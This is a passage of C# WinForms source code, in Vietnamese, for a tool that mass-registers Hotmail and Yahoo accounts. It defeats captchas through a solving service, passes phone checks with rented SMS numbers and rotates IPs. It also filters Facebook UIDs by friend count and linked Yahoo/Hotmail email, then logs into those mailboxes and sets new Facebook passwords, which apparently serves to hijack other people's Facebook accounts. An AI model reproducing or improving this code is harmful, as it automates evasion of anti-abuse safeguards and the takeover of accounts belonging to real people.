                sheet.SetColumnWidth(4, 5120);
                sheet.SetColumnWidth(5, 5120);
                int num = 0;
                IRow row = sheet.CreateRow(num);
                int minFriends = Convert.ToInt32(numericUpDown1.Value);
                foreach (DataGridViewRow item in dtgvVia.Rows)
                {
                    if (cbbMailDomain.SelectedIndex != 0)
                    {
                        if (cbbMailDomain.SelectedIndex == 1)
                        {
                            if (Convert.ToInt32(item.Cells["cFriend"].Value.ToString()) >= minFriends && item.Cells["cEmail"].Value.ToString().EndsWith("@yahoo.com"))
                            {
                                IRow row2 = sheet.CreateRow(num++);
                                row2.CreateCell(0).SetCellValue(item.Cells["cUid"].Value.ToString());
                                row2.CreateCell(1).SetCellValue(item.Cells["cEmail"].Value.ToString());
                            }
                        }
                        else
                        {
                            if (Convert.ToInt32(item.Cells["cFriend"].Value.ToString()) >= minFriends && item.Cells["cEmail"].Value.ToString().EndsWith("@hotmail.com"))
                            {
                                IRow row2 = sheet.CreateRow(num++);
                                row2.CreateCell(0).SetCellValue(item.Cells["cUid"].Value.ToString());
                                row2.CreateCell(1).SetCellValue(item.Cells["cEmail"].Value.ToString());
                            }
                        }
                    }
                    else
                    {
                        if (Convert.ToInt32(item.Cells["cFriend"].Value.ToString()) >= minFriends)
                        {
                            IRow row2 = sheet.CreateRow(num++);
                            row2.CreateCell(0).SetCellValue(item.Cells["cUid"].Value.ToString());
                            row2.CreateCell(1).SetCellValue(item.Cells["cEmail"].Value.ToString());
                        }
                    }

                }
                MemoryStream memoryStream = new MemoryStream();
                hssfworkbook.Write(memoryStream);
                FileStream fileStream = new FileStream(fileName, FileMode.Create, FileAccess.Write);
                memoryStream.WriteTo(fileStream);
                fileStream.Close();
                memoryStream.Close();
                MessageBox.Show("Xuất báo cáo thành công !", "Thông báo", MessageBoxButtons.OK, MessageBoxIcon.Information);
                Process.Start(saveFileDialog.FileName);
            }
        }

        private void BtnCheckAntiCaptcha_Click(object sender, EventArgs e)
        {
            var api = new ImageToText
            {
                ClientKey = txbAnticaptcha.Text
            };

            var balance = api.GetBalance();

            if (balance == null)
                MessageBox.Show("Lỗi API anti-captcha!", "Lỗi", MessageBoxButtons.OK, MessageBoxIcon.Error);
            else
                MessageBox.Show("Balance: " + balance, "Thông báo", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void Button1_Click(object sender, EventArgs e)
        {
            bool isChecked = false;
            for (int i = 0; i < gtgvRegMail.Rows.Count; i++)
            {
                if (Convert.ToBoolean(gtgvRegMail.Rows[i].Cells["choseReg"].Value))
                {
                    isChecked = true;
                    break;
                }
            }
            if (!isChecked)
            {
                MessageBox.Show("Vui lòng chọn một email", "Lỗi", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            DeleteImageCaptcha();
            int maxThread = Convert.ToInt32(nudThread.Value);
            int curThread = 0;
            int changeIpAfter = Convert.ToInt32(nudChangeIpCount.Value);
            int curChangeIp = 0;
            isStop = false;
            bool isDoneAll = true;
            btnStartReg.Enabled = false;
            btnStopReg.Enabled = true;
            new Thread(() =>
            {
                for (int i = 0; i < gtgvRegMail.Rows.Count;)
                {
                    if (Convert.ToBoolean(gtgvRegMail.Rows[i].Cells["choseReg"].Value))
                    {
                        while (isDoneAll == false)
                        {
                            Application.DoEvents();
                            Thread.Sleep(1000);
                            if (curThread <= 0)
                            {
                                Interlocked.Increment(ref curChangeIp);
                                if (curChangeIp >= changeIpAfter)
                                {
                                    ChangeIP();
                                    curChangeIp = 0;
                                }
                                isDoneAll = true;
                            }
                        }
                        if (curThread < maxThread)
                        {
                            if (isStop)
                            {
                                break;
                            }
                            Interlocked.Increment(ref curThread);
                            int row = i;
                            new Thread(() =>
                            {
                                RegMail(row);
                                gtgvRegMail.Rows[row].Cells["choseReg"].Value = false;
                                Interlocked.Decrement(ref curThread);
                            }).Start();
                            i++;
                        }
                        else if (curThread <= 0)
                        {
                            isDoneAll = true;
                        }
                        else
                        {
                            isDoneAll = false;
                            Thread.Sleep(1000);
                        }
                    }
                    else
                    {
                        i++;
                    }
                    if (isStop)
                    {
                        break;
                    }
                }
                while (curThread > 0)
                {
                    Thread.Sleep(500);
                    Application.DoEvents();
                }

                this.Invoke((MethodInvoker)delegate ()
                {
                    btnStartReg.Enabled = true;
                    btnStopReg.Enabled = false;
                });
            }).Start();
        }

        public static bool xemsex()
        {
            #region Khai báo request
            xNet.HttpRequest request = new xNet.HttpRequest();
            request.KeepAlive = true;
            request.Cookies = new CookieDictionary();
            request.AddHeader(HttpHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
            request.AddHeader(HttpHeader.AcceptLanguage, "en-US,en;q=0.5");
            request.UserAgent = Http.ChromeUserAgent();
            #endregion
            string ck = request.Get(fLogin.domain + "CheckMachine/?RequestKey=" + md5(md5(GetHDDSerialNumber()) + "handsome") + "&MachineSerial=" + md5(GetHDDSerialNumber()) + "&SoftIndex=" + fLogin.softIndex).ToString();
            if (ck == "true")
            {
                return true;
            }
            return false;
        }

        public static string GetHDDSerialNumber(string drive = null)
        {
            //check to see if the user provided a drive letter
            //if not default it to "C"
            if (drive == "" || drive == null)
            {
                drive = "C";
            }
            //create our ManagementObject, passing it the drive letter to the
            //DevideID using WQL
            ManagementObject disk = new ManagementObject("Win32_LogicalDisk.DeviceID=\"" + drive + ":\"");
            //bind our management object
            disk.Get();
            //return the serial number
            return disk["VolumeSerialNumber"].ToString();
        }

        public static string md5(string txt)
        {
            String str = "";
            Byte[] buffer = System.Text.Encoding.UTF8.GetBytes(txt);
            System.Security.Cryptography.MD5CryptoServiceProvider md5 = new System.Security.Cryptography.MD5CryptoServiceProvider();
            buffer = md5.ComputeHash(buffer);
            foreach (Byte b in buffer)
            {
                str += b.ToString("X2");
            }
            return str.ToLower();
        }

        private void RegMail(int i)
        {
            ChromeDriver chrome = null;
            string uidIm = "";
            string email = gtgvRegMail.Rows[i].Cells["emailReg"].Value.ToString();
            string passYahoo = txbPasswordYahoo.Text;
            string location = "";
            try
            {
                location = gtgvRegMail.Rows[i].Cells["addressReg"].Value.ToString();
            }
            catch { }
            try
            {
                uidIm = gtgvRegMail.Rows[i].Cells["uidReg"].Value.ToString();
            }
            catch { }
            if (ckbRandomMail.Checked)
            {
                passYahoo = CreateRandomPassword();
            }
            try
            {
                if (email.EndsWith("@hotmail.com"))
                {
                    LoadStatusGrid("Đang tạo Mail...", "statusReg", i, 1, gtgvRegMail);
                    ChromeOptions options = new ChromeOptions();
                    options.AddArgument("--disable-notifications"); // to disable notification
                    options.AddArgument("--window-size=700,700");
                    options.AddArgument("--window-position=0,0");
                    options.AddArgument("--blink-settings=imagesEnabled=false");
                    ChromeDriverService service = ChromeDriverService.CreateDefaultService();
                    service.HideCommandPromptWindow = true;
                    try
                    {
                        chrome = new ChromeDriver(service, options, TimeSpan.FromSeconds(120));
                    }
                    catch
                    {
                        chrome = new ChromeDriver(service, new ChromeOptions(), TimeSpan.FromSeconds(120));
                    }
                    chrome.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(5);
                    chrome.Manage().Timeouts().PageLoad = TimeSpan.FromSeconds(120);
                    IJavaScriptExecutor js = chrome as IJavaScriptExecutor;

                    chrome.Navigate().GoToUrl("https://signup.live.com/signup");
                    chrome.FindElementById("MemberName").SendKeys(email);
                    Thread.Sleep(500);
                    try
                    {
                        chrome.FindElementById("LiveDomainBoxList").Click();
                    }
                    catch { }
                    chrome.FindElementById("iSignupAction").Click();
                    Thread.Sleep(5000);
                    try
                    {
                        string err = (string)js.ExecuteScript("var a= document.querySelector('#MemberName').value;return a;");
                        if (err != "")
                        {
                            //if (err.Contains("already a Microsoft account"))
                            //{
                            LoadStatusGrid("Mail đã tồn tại!", "statusReg", i, 2, gtgvRegMail);
                            chrome.Quit();
                            return;
                            //}
                        }
                    }
                    catch { }
                    try
                    {
                        chrome.FindElementById("iProofSignIn").Click();
                        LoadStatusGrid("Mail đã tồn tại!", "statusReg", i, 2, gtgvRegMail);
                        chrome.Quit();
                        return;
                    }
                    catch { }
                    chrome.FindElementById("PasswordInput").SendKeys(passYahoo);
                    chrome.FindElementById("iSignupAction").Click();
                    Thread.Sleep(3000);
                    chrome.FindElementById("FirstName").SendKeys(TenVietNam().Trim());
                    chrome.FindElementById("LastName").SendKeys(HoVietNam().Trim());
                    chrome.FindElementById("iSignupAction").Click();
                    Thread.Sleep(3000);
                    js.ExecuteScript("document.getElementById('Country').value = \"VN\";");

                    try
                    {
                        chrome.FindElementById("BirthMonth").Click();
                        Thread.Sleep(1000);
                        chrome.FindElementByXPath("//*[@id=\"BirthMonth\"]/option[" + rd.Next(2, 12) + "]").Click();
                    }
                    catch
                    {
                        js.ExecuteScript("document.getElementById('BirthMonth').value =" + rd.Next(2, 12) + ";");
                    }

                    try
                    {
                        Thread.Sleep(1000);
                        chrome.FindElementById("BirthDay").Click();
                        Thread.Sleep(1000);
                        chrome.FindElementByXPath("//*[@id=\"BirthDay\"]/option[" + rd.Next(2, 28) + "]").Click();
                    }
                    catch
                    {
                        js.ExecuteScript("document.getElementById('BirthDay').value =" + rd.Next(2, 25) + ";");
                    }

                    try
                    {
                        Thread.Sleep(1000);
                        chrome.FindElementById("BirthYear").Click();
                        Thread.Sleep(1000);
                        chrome.FindElementByXPath("//*[@id=\"BirthYear\"]/option[" + rd.Next(19, 34) + "]").Click();
                        Thread.Sleep(1000);
                    }
                    catch
                    {
                        js.ExecuteScript("document.getElementById('BirthYear').value =" + rd.Next(1990, 2000) + ";");
                    }

                    try
                    {
                        chrome.FindElementById("iSignupAction").Click();
                    }
                    catch
                    {
                        js.ExecuteAsyncScript("document.getElementById('iSignupAction').click();");
                    }
                    Thread.Sleep(5000);

                    string linksrc = "";
                    try
                    {
                        linksrc = chrome.FindElementByXPath("//*[@id=\"hipTemplateContainer\"]/div[1]/img").GetAttribute("src");
                    }
                    catch { }
                    if (linksrc != "" && linksrc.Contains("hid"))
                    {
                        bool isCorrectCaptcha = true; int lanGiaiCaptcha = 2;
                        do
                        {
                            LoadStatusGrid("Đang giải captcha...", "statusReg", i, 1, gtgvRegMail);
                            string filename = "";
                            lock (lockObj)
                            {
                                filename = DownloadImageByLink(linksrc);
                            }
                            if (filename == "")
                            {
                                LoadStatusGrid("Lỗi Thread!!!", "statusReg", i, 2, gtgvRegMail);
                                return;
                            }
                            string captchcode = ExampleImageToText(filename, txbAnticaptcha.Text).Replace(" ", "");
                            chrome.FindElementByXPath("//*[@id=\"hipTemplateContainer\"]/div[3]/input").SendKeys(captchcode);
                            Thread.Sleep(1000);
                            try
                            {
                                chrome.FindElementById("iSignupAction").Click();
                            }
                            catch
                            {
                                js.ExecuteAsyncScript("document.getElementById('iSignupAction').click();");
                            }
                            Thread.Sleep(3000);
                            try
                            {
                                var kt = chrome.FindElementByClassName("alert-error");
                                LoadStatusGrid("Giải sai captcha!", "statusReg", i, 1, gtgvRegMail);
                                Thread.Sleep(500);
                            }
                            catch
                            {
                                isCorrectCaptcha = true;
                            }
                            lanGiaiCaptcha--;
                        } while (isCorrectCaptcha == false && lanGiaiCaptcha > 0);
                        if (isCorrectCaptcha == false)
                        {
                            LoadStatusGrid("Lỗi giải captcha!", "statusReg", i, 2, gtgvRegMail);
                            chrome.Quit();
                            return;
                        }
                        LoadStatusGrid("Giải thành công", "statusReg", i, 1, gtgvRegMail);
                    }
                    else
                    {
                        var capt = chrome.FindElementById("hipTemplateContainer");
                        if (capt.Displayed)
                        {
                            try
                            {
                                string idSelect = capt.FindElement(By.TagName("select")).GetAttribute("id");
                                js.ExecuteScript("document.getElementById('" + idSelect + "').value = \"VN\";");
                                var idInputPhone = capt.FindElement(By.TagName("input"));

                                string dataApi = CreatePhoneApiSimthue("21");
                                if (dataApi == "" || dataApi.Contains("|") == false)
                                {
                                    LoadStatusGrid("Lỗi API!", "statusReg", i, 2, gtgvRegMail);
                                    chrome.Quit();
                                    return;
                                }
                                string phone = dataApi.Split('|')[0];
                                string idRequest = dataApi.Split('|')[1];
                                idInputPhone.SendKeys(phone);
                                chrome.FindElementById("wlspispHipControlButtonsContainer").Click();
                                Thread.Sleep(2000);
                                #region Đọc OTP
                                int timeStart = Environment.TickCount;
                                string smsCode = "";
                                if (rdSimthue.Checked)
                                {
                                    smsCode = ReadOtpSimthue(idRequest);
                                }
                                #endregion
                                if (smsCode != "")
                                {
                                    chrome.FindElementByXPath("//*[@id=\"wlspispHipSolutionContainer\"]/div/input").SendKeys(smsCode);
                                    Thread.Sleep(1000);
                                    try
                                    {
                                        chrome.FindElementById("iSignupAction").Click();
                                    }
                                    catch
                                    {
                                        try
                                        {
                                            js.ExecuteAsyncScript("document.getElementById('iSignupAction').click();");
                                        }
                                        catch { }
                                    }
                                }
                                else
                                {
                                    LoadStatusGrid("Lỗi đọc OTP!", "statusReg", i, 2, gtgvRegMail);
                                    chrome.Quit();
                                    return;
                                }
                            }
                            catch
                            {
                                LoadStatusGrid("Lỗi tạo sđt!", "statusReg", i, 2, gtgvRegMail);
                                chrome.Quit();
                                return;
                            }

                        }
                    }
                    Thread.Sleep(5000);
                    //reg success
                    if (chrome.Url.Contains("https://account.microsoft.com"))
                    {
                        string uidmm = "";
                        try
                        {
                            uidmm = gtgvRegMail.Rows[i].Cells["uidReg"].Value.ToString();
                        }
                        catch { }
                        LoadStatusGrid("Đăng kí thành công!", "statusReg", i, 1, gtgvRegMail);
                        File.AppendAllText("account//hotmailNo.txt", email + "|" + passYahoo + "|" + uidIm + "|" + location + "\r\n");
                        chrome.Quit();
                    }
                    else
                    {
                        LoadStatusGrid("Lỗi đăng kí!", "statusReg", i, 2, gtgvRegMail);
                        chrome.Quit();
                    }
                }
                else if (email.EndsWith("@yahoo.com"))
                {
                    string subemail = email.Replace("@yahoo.com", "");
                    string apiKey = txbApiKeySimthue.Text;

                    LoadStatusGrid("Đang tạo Mail...", "statusReg", i, 1, gtgvRegMail);

                    ChromeOptions options = new ChromeOptions();
                    //options.AddArguments("--disable-extensions"); // to disable extension
                    options.AddArguments("--disable-notifications"); // to disable notification
                    options.AddArgument("--window-size=700,700");
                    options.AddArgument("--window-position=0,0");
                    options.AddArgument("--blink-settings=imagesEnabled=false");
                    if (ckbProfile.Checked)
                    {
                        if (uidIm != "")
                        {
                            string profilePath = @"profile/" + uidIm;
                            if (!Directory.Exists(profilePath))
                            {
                                Directory.CreateDirectory(profilePath);
                            }
                            options.AddArgument("--user-data-dir=" + profilePath);
                        }
                    }
                    ChromeDriverService service = ChromeDriverService.CreateDefaultService();
                    service.HideCommandPromptWindow = true;
                    try
                    {
                        chrome = new ChromeDriver(service, options, TimeSpan.FromSeconds(120));
                    }
                    catch
                    {
                        chrome = new ChromeDriver(service, new ChromeOptions(), TimeSpan.FromSeconds(120));
                    }
                    chrome.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(5);
                    chrome.Manage().Timeouts().PageLoad = TimeSpan.FromSeconds(120);
                    IJavaScriptExecutor js = chrome as IJavaScriptExecutor;

                    chrome.Navigate().GoToUrl("https://login.yahoo.com/account/create?intl=vn&lang=vi");
                    //email input
                    chrome.FindElementById("usernamereg-yid").SendKeys(subemail);
                    try
                    {
                        js.ExecuteScript("document.getElementsByName('shortCountryCode')[0].value=\"VN\";");
                    }
                    catch { }
                    chrome.FindElementById("usernamereg-firstName").SendKeys(TenVietNam());
                    chrome.FindElementById("usernamereg-lastName").SendKeys(HoVietNam());

                    ////pass
                    chrome.FindElementById("usernamereg-password").SendKeys(passYahoo);

                    //datebirth
                    js.ExecuteScript("document.getElementById('usernamereg-month').value=" + rd.Next(1, 12));
                    chrome.FindElementById("usernamereg-day").SendKeys("" + rd.Next(1, 29));
                    chrome.FindElementById("usernamereg-year").SendKeys("" + rd.Next(1990, 2000));
                    Thread.Sleep(2000);
                    string html = (string)js.ExecuteScript("var markup = document.documentElement.innerHTML;return markup;");
                    if (html.Contains("messages.IDENTIFIER"))
                    {
                        LoadStatusGrid("Mail tồn tại!", "statusReg", i, 1, gtgvRegMail);
                        chrome.Quit();
                        return;
                    }

                    LoadStatusGrid("Đang tạo SĐT...", "statusReg", i, 1, gtgvRegMail);

                    #region Khai báo request
                    xNet.HttpRequest request = new xNet.HttpRequest();
                    request.KeepAlive = true;
                    request.Cookies = new CookieDictionary();
                    request.AddHeader(HttpHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                    request.AddHeader(HttpHeader.AcceptLanguage, "en-US,en;q=0.5");
                    request.UserAgent = Http.ChromeUserAgent();
                    #endregion

                    string jsonCreate = request.Get("http://api.pvaonline.net/request/create?key=" + apiKey + "&service_id=29").ToString();
                    JObject objCreate = JObject.Parse(jsonCreate);
                    string idRequest = "", phone = "";
                    try
                    {
                        if (objCreate["success"].ToString().ToLower() == "true")
                        {
                            idRequest = objCreate["id"].ToString();
                        }
                        else
                        {
                            LoadStatusGrid("Lỗi API", "statusReg", i, 2, gtgvRegMail);
                            chrome.Quit();
                            return;
                        }
                    }
                    catch
                    {
                        LoadStatusGrid("Lỗi API", "statusReg", i, 2, gtgvRegMail);
                        chrome.Quit();
                        return;
                    }

                    string jsonRead = request.Get("http://api.pvaonline.net/request/check?key=" + apiKey + "&id=" + idRequest).ToString();
                    JObject objRead = JObject.Parse(jsonRead);
                    int timeStart = Environment.TickCount;
                    if (rdSimthue.Checked)
                    {
                        do
                        {
                            Thread.Sleep(5000);
                            if (Environment.TickCount - timeStart >= 155000)
                            {
                                LoadStatusGrid("Lỗi Timeout!", "statusReg", i, 2, gtgvRegMail);
                                chrome.Quit();
                                return;
                            }
                            try
                            {
                                phone = objRead["number"].ToString();
                                if (phone != "")
                                    phone = phone.Substring(2);
                                else
                                {
                                    jsonRead = request.Get("http://api.pvaonline.net/request/check?key=" + apiKey + "&id=" + idRequest).ToString();
                                    objRead = JObject.Parse(jsonRead);
                                }
                            }
                            catch
                            {

                            }
                        } while (phone.Equals(""));
                    }
                    LoadStatusGrid("Tạo thành công!", "statusReg", i, 1, gtgvRegMail);
                    //phone input
                    chrome.FindElementById("usernamereg-phone").SendKeys(phone);
                    chrome.FindElementById("reg-submit-button").Click();
                    bool isLoadDone = false;
                    timeStart = Environment.TickCount;
                    do
                    {
                        Thread.Sleep(1000);

                        //verify
                        Thread.Sleep(3000);
                        try
                        {
                            //chrome.FindElementByXPath("//button[@name='resendCode']").Click();
                            chrome.FindElementByName("sendCode").Click();
                            isLoadDone = true;
                        }
                        catch
                        {
                            try
                            {
                                chrome.FindElementById("reg-submit-button").Click();
                                isLoadDone = true;
                            }
                            catch
                            {
                                try
                                {
                                    chrome.FindElementByName("resendCode").Click();
                                }
                                catch { }
                            }
                        }
                        if (chrome.Url.Contains("fail"))
                        {
                            LoadStatusGrid("Sim dùng quá nhiều lần!", "statusReg", i, 2, gtgvRegMail);
                            chrome.Quit();
                            return;
                        }
                        if (Environment.TickCount - timeStart >= 20000)
                        {
                            break;
                        }
                    } while (isLoadDone == false);

                    if (isLoadDone == false)
                    {
                        Thread.Sleep(1000);
                        if (chrome.Url.Contains("fail"))
                        {
                            LoadStatusGrid("Sim dùng quá nhiều lần!", "statusReg", i, 2, gtgvRegMail);
                            chrome.Quit();
                            return;
                        }
                        LoadStatusGrid("Lỗi đăng kí!", "statusReg", i, 2, gtgvRegMail);
                        chrome.Quit();
                        return;
                    }
                    string smsCode = ""; bool isHaveCode = false;
                    LoadStatusGrid("Đang chờ OTP...", "statusReg", i, 1, gtgvRegMail);
                    bool isResend = false;
                    timeStart = Environment.TickCount;
                    if (rdSimthue.Checked)
                    {
                        do
                        {
                            Thread.Sleep(5000);
                            if (Environment.TickCount - timeStart >= 155000)
                            {
                                LoadStatusGrid("Lỗi Timeout", "statusReg", i, 2, gtgvRegMail);
                                chrome.Quit();
                                return;
                            }
                            if (isResend == false)
                            {
                                try
                                {
                                    chrome.FindElementByName("resendCode").Click();
                                    isResend = true;
                                }
                                catch
                                {

                                }
                            }

                            jsonRead = request.Get("http://api.pvaonline.net/request/check?key=" + apiKey + "&id=" + idRequest).ToString();
                            objRead = JObject.Parse(jsonRead);
                            try
                            {
                                if (objRead["sms"].Count() > 0)
                                {
                                    string data = objRead["sms"][0].ToString();
                                    smsCode = Regex.Match(data.Split('|')[2], "\\d{5}").Value;
                                    if (smsCode.Trim().Length != 5)
                                        continue;
                                    isHaveCode = true;
                                }
                            }
                            catch
                            {

                                LoadStatusGrid("Lỗi đọc OTP!", "statusReg", i, 2, gtgvRegMail);
                                chrome.Quit();
                                return;
                            }
                        } while (isHaveCode == false);
                    }
                    Thread.Sleep(1000);

                    //chrome.FindElementById("verification-code-field").SendKeys(smsCode);
                    js.ExecuteScript("document.getElementById('verification-code-field').value=\"" + smsCode + "\";");
                    Thread.Sleep(500);
                    js.ExecuteScript("document.getElementsByName('verifyCode')[0].click();");
                    Thread.Sleep(6000);
                    chrome.Url = "https://mail.yahoo.com";
                    Thread.Sleep(3000);
                    if (chrome.Url.Contains("https://login.yahoo.com"))
                    {
                        LoadStatusGrid("Lỗi tạo mail!", "statusReg", i, 2, gtgvRegMail);
                        chrome.Quit();
                        return;
                    }
                    else if (chrome.Url.Contains("https://mail.yahoo.com/?guccounter"))
                    {
                        chrome.Navigate().Refresh();
                        Thread.Sleep(1000);
                    }
                    File.AppendAllText("account//yahooNo.txt", email + "|" + passYahoo + "|" + uidIm + "|" + location + "\r\n");
                    LoadStatusGrid("Tạo Mail thành công!", "statusReg", i, 1, gtgvRegMail);
                    chrome.Quit();
                }
            }
            catch (Exception ex)
            {
                File.AppendAllText("account//dontknow.txt", email + "|" + passYahoo + "|" + uidIm + "\r\n");
                LoadStatusGrid("Lỗi không xác định!", "statusReg", i, 2, gtgvRegMail);
                try
                {
                    chrome.Quit();
                }
                catch { }
            }
        }

        private void PasteToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                DataObject o = (DataObject)Clipboard.GetDataObject();
                string[] pastedRows = Regex.Split(o.GetData(DataFormats.Text).ToString().TrimEnd("\r\n".ToCharArray()), "\r\n");
                foreach (string pastedRow in pastedRows)
                {
                    if (!pastedRow.Replace("\t", "").Trim().Equals(""))
                    {
                        string[] pastedRowCells = pastedRow.Split(new char[] { '\t' });
                        if (pastedRowCells.Length == 1)
                        {
                            int myRowIndex = gtgvRegMail.Rows.Add();
                            gtgvRegMail.Rows[myRowIndex].Cells["emailReg"].Value = pastedRowCells[0];
                        }
                        else if (pastedRowCells.Length == 2)
                        {
                            int myRowIndex = gtgvRegMail.Rows.Add();
                            for (int i = 0; i < 2; i++)
                            {
                                gtgvRegMail.Rows[myRowIndex].Cells[i + 1].Value = pastedRowCells[i];
                            }
                        }
                        else if (pastedRowCells.Length >= 3)
                        {
                            int myRowIndex = gtgvRegMail.Rows.Add();
                            gtgvRegMail.Rows[myRowIndex].Cells[1].Value = pastedRowCells[0];
                            gtgvRegMail.Rows[myRowIndex].Cells[2].Value = pastedRowCells[1];
                            gtgvRegMail.Rows[myRowIndex].Cells[3].Value = pastedRowCells[2];

                        }
                    }
                }
            }
            catch { }
        }

        private void ToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < gtgvRegMail.RowCount; i++)
            {
                gtgvRegMail.Rows[i].Cells["choseReg"].Value = true;
            }
        }

        private void ToolStripMenuItem3_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < gtgvRegMail.RowCount; i++)
            {
                gtgvRegMail.Rows[i].Cells["choseReg"].Value = false;
            }
        }

        private void ToolStripMenuItem4_Click(object sender, EventArgs e)
        {
            try
            {
                string textCopy = "";
                for (int i = 0; i < gtgvRegMail.RowCount; i++)
                {
                    if (Convert.ToBoolean(gtgvRegMail.Rows[i].Cells["choseReg"].Value))
                    {
                        textCopy += gtgvRegMail.Rows[i].Cells["uidReg"].Value.ToString() + "\t" + gtgvRegMail.Rows[i].Cells["emailReg"].Value.ToString() + "\r\n";
                    }
                }
                Clipboard.SetText(textCopy);
            }
            catch { }
        }

        private void ToolStripMenuItem5_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < gtgvRegMail.RowCount; i++)
            {
                if (Convert.ToBoolean(gtgvRegMail.Rows[i].Cells["choseReg"].Value))
                {
                    gtgvRegMail.Rows.RemoveAt(i);
                    i--;
                }
            }
        }

        private void BtnStopReg_Click(object sender, EventArgs e)
        {
            isStop = true;
            this.Invoke((MethodInvoker)delegate ()
            {
                btnStartReg.Enabled = true;
                btnStopReg.Enabled = false;
            });
        }

        private void RdOtp_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void Button3_Click(object sender, EventArgs e)
        {
            OpenFileDialog fopen = new OpenFileDialog();
            fopen.Filter = "txt files (*.txt)|*.txt";
            if (fopen.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    string filename = fopen.FileName;
                    string[] arrToken = File.ReadAllLines(filename);
                    if (arrToken.Length > 0)
                    {
                        for (int i = 0; i < arrToken.Length; i++)
                        {
                            try
                            {
                                string[] dtt = arrToken[i].Split('|');
                                if (dtt.Length == 2)
                                {
                                    dtgvViaAcc.Rows.Add(false, "", dtt[0], "", "", dtt[1]);
                                }
                                else if (dtt.Length == 3)
                                {
                                    dtgvViaAcc.Rows.Add(false, dtt[2], dtt[0], "", "", dtt[1]);
                                }
                                else if (dtt.Length == 4)
                                {
                                    dtgvViaAcc.Rows.Add(false, dtt[2], dtt[0], dtt[3], "", dtt[1]);
                                }
                            }
                            catch { }

                        }
                    }
                }
                catch { }

            }
        }

        private void Button1_Click_1(object sender, EventArgs e)
        {
            bool isChecked = false;
            for (int i = 0; i < dtgvViaAcc.Rows.Count; i++)
            {
                if (Convert.ToBoolean(dtgvViaAcc.Rows[i].Cells["choseVia"].Value))
                {
                    isChecked = true;
                    break;
                }
            }
            if (!isChecked)
            {
                MessageBox.Show("Vui lòng chọn một email", "Lỗi", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            DeleteImageCaptcha();
            int maxThread = Convert.ToInt32(nudThread.Value);
            int curThread = 0;
            int changeIpAfter = Convert.ToInt32(nudChangeIpCount.Value);
            int curChangeIp = 0;
            isStop = false;
            bool isDoneAll = true;
            btnStartRecover.Enabled = false;
            btnStopRecover.Enabled = true;
            new Thread(() =>
            {
                for (int i = 0; i < dtgvViaAcc.Rows.Count;)
                {
                    if (Convert.ToBoolean(dtgvViaAcc.Rows[i].Cells["choseVia"].Value))
                    {
                        while (isDoneAll == false)
                        {
                            Application.DoEvents();
                            Thread.Sleep(1000);
                            if (curThread <= 0)
                            {
                                Interlocked.Increment(ref curChangeIp);
                                if (curChangeIp >= changeIpAfter)
                                {
                                    ChangeIP();
                                    curChangeIp = 0;
                                }
                                isDoneAll = true;
                            }
                        }
                        if (curThread < maxThread)
                        {
                            if (isStop)
                            {
                                break;
                            }
                            Interlocked.Increment(ref curThread);
                            int row = i;
                            new Thread(() =>
                            {
                                ReCoverMail(row);
                                dtgvViaAcc.Rows[row].Cells["choseVia"].Value = false;
                                Interlocked.Decrement(ref curThread);
                            }).Start();
                            i++;
                        }
                        else if (curThread <= 0)
                        {
                            isDoneAll = true;
                        }
                        else
                        {
                            isDoneAll = false;
                            Thread.Sleep(1000);
                        }
                    }
                    else
                    {
                        i++;
                    }
                    if (isStop)
                    {
                        break;
                    }
                }
                while (curThread > 0)
                {
                    Thread.Sleep(500);
                    Application.DoEvents();
                }

                this.Invoke((MethodInvoker)delegate ()
                {
                    btnStartRecover.Enabled = true;
                    btnStopRecover.Enabled = false;
                });
            }).Start();
        }

        private void ReCoverMail(int row)
        {
            int i = (int)row;
            ChromeDriver chrome = null;
            string uidIm = "";
            string passYahoo = dtgvViaAcc.Rows[i].Cells["passVia"].Value.ToString();
            string passFacebook = txbPasswordFb.Text;
            if (ckbRandomFacebook.Checked)
            {
                passFacebook = CreateRandomPassword();
            }
            try
            {
                string email = dtgvViaAcc.Rows[i].Cells["mailVia"].Value.ToString();
                try
                {
                    uidIm = dtgvViaAcc.Rows[i].Cells["uidVia"].Value.ToString();
                }
                catch { }
                if (email.EndsWith("yahoo.com"))
                {
                    LoadStatusGrid("Đang đăng nhập...", "statusVia", i, 1, dtgvViaAcc);
                    ChromeOptions options = new ChromeOptions();
                    options.AddArgument("--disable-notifications"); // to disable notification
                    options.AddArgument("--window-size=700,700");
                    options.AddArgument("--window-position=0,0");
                    options.AddArgument("--blink-settings=imagesEnabled=false");
                    if (ckbProfile.Checked)
                    {
                        if (uidIm != "")
                        {
                            string profilePath = @"profile/" + uidIm;
                            if (!Directory.Exists(profilePath))
                            {
                                Directory.CreateDirectory(profilePath);
                            }
                            options.AddArgument("--user-data-dir=" + profilePath);
                        }
                        else
                        {
                            LoadStatusGrid("Không có UID", "statusVia", i, 2, dtgvViaAcc);
                            return;
                        }
                    }
                    ChromeDriverService service = ChromeDriverService.CreateDefaultService();
                    service.HideCommandPromptWindow = true;
                    try
                    {
                        chrome = new ChromeDriver(service, options, TimeSpan.FromSeconds(120));
                    }
                    catch
                    {
                        chrome = new ChromeDriver(service, new ChromeOptions(), TimeSpan.FromSeconds(120));
                    }
                    chrome.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(5);
                    chrome.Manage().Timeouts().PageLoad = TimeSpan.FromSeconds(120);
                    IJavaScriptExecutor js = chrome as IJavaScriptExecutor;
                    chrome.Navigate().GoToUrl("https://login.yahoo.com/");
                    chrome.FindElementById("login-username").SendKeys(email);
                    Thread.Sleep(1000);
                    //chrome.FindElementById("login-signin").Click();
                    js.ExecuteScript("document.querySelector('#login-signin').click();");
                    Thread.Sleep(3000);
                    try
                    {
                        if (chrome.FindElementById("username-error").Displayed)
                        {
                            LoadStatusGrid("Mail chưa đăng kí", "statusVia", i, 2, dtgvViaAcc);
